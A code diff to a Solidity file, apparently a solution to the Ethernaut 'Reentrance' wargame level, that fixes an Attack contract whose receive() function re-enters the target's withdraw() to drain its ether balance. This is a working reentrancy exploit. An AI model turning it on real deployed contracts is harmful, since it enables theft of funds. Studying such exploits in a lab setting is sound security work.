@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
-import 'openzeppelin-contracts-06/math/SafeMath.sol';
+import 'openzeppelin-contracts/math/SafeMath.sol';
 
 contract Reentrance {
   
@@ -30,17 +30,20 @@ contract Reentrance {
 }
 
 contract Attack {
+
   Reentrance reentrance;
 
-  constructor(address _reentranceAddr) {
-    reentrance = new Reentrance(_reentranceAddr);
+  constructor(address payable _reentranceAddr) public {
+    reentrance = Reentrance(_reentranceAddr);
   }
 
   function deposit() public payable {
-    reentrance.donate(msg.value);
+    reentrance.donate{value: msg.value}(address(this));
   }
 
   receive() external payable {
+    if (address(reentrance).balance < msg.value) return;
+
     reentrance.withdraw(msg.value);
   }
 }
